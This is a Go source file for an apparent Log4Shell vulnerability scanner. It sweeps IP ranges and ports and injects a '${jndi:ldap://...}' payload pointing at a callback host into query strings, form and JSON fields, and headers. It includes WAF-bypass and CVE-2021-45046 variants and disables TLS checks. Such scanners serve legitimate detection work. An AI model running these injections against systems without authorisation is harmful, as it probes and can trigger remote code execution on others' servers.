package internal

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"time"
)

const (
	defaultUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	windowsUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	darwinUserAgent  = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
)

type StatusCodeHandlerFunc func(ctx context.Context, client *http.Client, resp *http.Response, req *http.Request, payload string, opts *RemoteOptions)

type RemoteOptions struct {
	CADDR              string
	RequestType        string
	Proxies            []*url.URL
	Resource           string
	NoUserAgentFuzzing bool
	NoRedirect         bool
	WafBypass          bool
	HeadersFile        string
	Headers            []string
	FieldsFile         string
	Fields             []string
	PayLoadsFile       string
	Payloads           []string
	Timeout            time.Duration
	CheckCVE2021_45046 bool
}
type RemoteScanner struct {
	client             *http.Client
	payloads           []string
	fields             []string
	statusCodeHandlers map[int]StatusCodeHandlerFunc
	opts               *RemoteOptions
}

func NewRemoteScanner(opts *RemoteOptions) (*RemoteScanner, error) {
	p, err := createPayloads(opts)
	if err != nil {
		return nil, err
	}

	f, err := readFields(opts)
	if err != nil {
		return nil, err
	}

	if len(opts.Fields) > 0 {
		f = opts.Fields
	}

	return &RemoteScanner{
		client:             newHTTPClient(opts),
		payloads:           p,
		fields:             f,
		statusCodeHandlers: make(map[int]StatusCodeHandlerFunc),
		opts:               opts,
	}, nil
}

func (rs *RemoteScanner) CIDRWalk(cidr, schema string, ports []string, fn func(url, payload string) error) error {
	_, ipv4Net, err := net.ParseCIDR(cidr)
	if err != nil {
		return err
	}

	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	finish := (start & mask) | (mask ^ 0xffffffff)

	for i := start; i <= finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)

		for _, p := range ports {
			url := fmt.Sprintf("%s://%s:%s", schema, ip, p)

			for _, p := range rs.payloads {
				if err := fn(url, p); err != nil {
					return err
				}
			}
		}
	}

	return nil
}

func (rs *RemoteScanner) Scan(ctx context.Context, method, target, payload string) error {
	req, err := rs.newRequest(ctx, method, target, payload)
	if err != nil {
		return err
	}

	resp, err := rs.client.Do(req)
	if err != nil {
		// ignore
		return nil
	}

	defer resp.Body.Close()

	if handler, ok := rs.statusCodeHandlers[resp.StatusCode]; ok {
		handler(ctx, rs.client, resp, req, payload, rs.opts)
	}

	return nil
}

func (rs *RemoteScanner) StatusCodeHandler(code int, fn StatusCodeHandlerFunc) {
	rs.statusCodeHandlers[code] = fn
}

func (rs *RemoteScanner) newRequest(ctx context.Context, method, u, payload string) (*http.Request, error) {
	var (
		req *http.Request
		err error
	)

	header, err := rs.newHTTPHeader(payload)
	if err != nil {
		return nil, err
	}

	switch method {
	case "get":
		req, err = http.NewRequestWithContext(ctx, "GET", u, nil)
		if err != nil {
			return nil, err
		}
	case "post":
		header.Set("Content-Type", "application/x-www-form-urlencoded")

		data := url.Values{}
		for _, field := range rs.fields {
			data.Set(field, payload)
		}

		req, err = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(data.Encode()))
		if err != nil {
			return nil, err
		}
	case "json":
		header.Set("Content-Type", "application/json")

		values := make(map[string]string)
		for _, field := range rs.fields {
			values[field] = payload
		}

		jsonValue, err := json.Marshal(values)
		if err != nil {
			return nil, err
		}

		req, err = http.NewRequestWithContext(ctx, "POST", u, bytes.NewBuffer(jsonValue))
		if err != nil {
			return nil, err
		}
	}

	req.Header = header

	// Add payload as query string
	values := req.URL.Query()
	values.Add("q", payload)
	req.URL.RawQuery = values.Encode()

	return req, nil
}

func (rs *RemoteScanner) Payloads() []string {
	return rs.payloads
}

func (rs *RemoteScanner) newHTTPHeader(payload string) (http.Header, error) {
	keys, err := readHeaders(rs.opts)
	if err != nil {
		return nil, err
	}

	if len(rs.opts.Headers) > 0 {
		keys = rs.opts.Headers
	}

	var userAgent string

	switch runtime.GOOS {
	case "windows":
		userAgent = windowsUserAgent
	case "darwin":
		userAgent = darwinUserAgent
	default:
		userAgent = defaultUserAgent
	}

	header := make(http.Header)

	header.Set("User-Agent", userAgent)
	header.Set("Accept", "*/*")

	for _, h := range keys {
		h = http.CanonicalHeaderKey(h)

		if h == "User-Agent" && !rs.opts.NoUserAgentFuzzing {
			header.Set("User-Agent", payload)
			continue
		}

		if h == "Referer" {
			header.Set("Referer", fmt.Sprintf("https://%s", payload))
			continue
		}

		if h == "Cookie" {
			header.Set("Cookie", fmt.Sprintf("SessCookie=%s", payload))
			continue
		}

		header.Add(h, payload)
	}

	return header, nil
}

func newHTTPClient(opts *RemoteOptions) *http.Client {
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	transport.Proxy = http.ProxyFromEnvironment
	if len(opts.Proxies) == 1 { // TODO Allow more than one proxy
		transport.Proxy = http.ProxyURL(opts.Proxies[0])
	}

	client := &http.Client{
		Timeout:   opts.Timeout,
		Transport: transport,
	}

	if opts.NoRedirect {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	return client
}

func createPayloads(opts *RemoteOptions) ([]string, error) {
	resource := "l4s"
	if opts.Resource != "" {
		resource = opts.Resource
	}

	if len(opts.Payloads) > 0 {
		customPayloads := []string{}

		for _, p := range opts.Payloads {
			t, err := template.New("custom-payload").Parse(p)
			if err != nil {
				return nil, err
			}

			parsed, err := executeTemplate(t, resource, opts.CADDR)
			if err != nil {
				return nil, err
			}

			customPayloads = append(customPayloads, string(parsed))
		}

		return customPayloads, nil
	}

	if opts.PayLoadsFile != "" {
		t, err := template.ParseFiles(opts.PayLoadsFile)
		if err != nil {
			return nil, err
		}

		p, err := executeTemplate(t, resource, opts.CADDR)
		if err != nil {
			return nil, err
		}

		return parseFileContent(p), nil
	}

	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/%s}", opts.CADDR, resource)}

	if opts.WafBypass {
		t, err := template.ParseFS(f, "resource/bypass.txt")
		if err != nil {
			return nil, err
		}

		p, err := executeTemplate(t, resource, opts.CADDR)
		if err != nil {
			return nil, err
		}

		payloads = append(payloads, parseFileContent(p)...)
	}

	if opts.CheckCVE2021_45046 {
		t, err := template.ParseFS(f, "resource/cve_2021_45046.txt")
		if err != nil {
			return nil, err
		}

		p, err := executeTemplate(t, "l4s", opts.CADDR)
		if err != nil {
			return nil, err
		}

		payloads = append(payloads, parseFileContent(p)...)
	}

	return payloads, nil
}

func readFields(opts *RemoteOptions) ([]string, error) {
	if opts.FieldsFile != "" {
		data, err := ioutil.ReadFile(opts.FieldsFile)
		if err != nil {
			return nil, err
		}

		return parseFileContent(data), nil
	}

	data, err := f.ReadFile("resource/fields.txt")
	if err != nil {
		return nil, err
	}

	return parseFileContent(data), nil
}

func readHeaders(opts *RemoteOptions) ([]string, error) {
	if opts.HeadersFile != "" {
		data, err := ioutil.ReadFile(opts.HeadersFile)
		if err != nil {
			return nil, err
		}

		return parseFileContent(data), nil
	}

	data, err := f.ReadFile("resource/header.txt")
	if err != nil {
		return nil, err
	}

	return parseFileContent(data), nil
}

func parseFileContent(data []byte) []string {
	content := []string{}

	for _, d := range strings.Split(string(data), "\n") {
		d = strings.Trim(d, " ")
		if !strings.HasPrefix(d, "#") && d != "" { // ignore comments and empty lines
			content = append(content, d)
		}
	}

	return content
}

func executeTemplate(t *template.Template, resource string, caddr string) ([]byte, error) {
	var buf bytes.Buffer
	if err := t.Execute(&buf, map[string]string{
		"CADDR":    caddr,
		"Resource": resource,
	}); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}
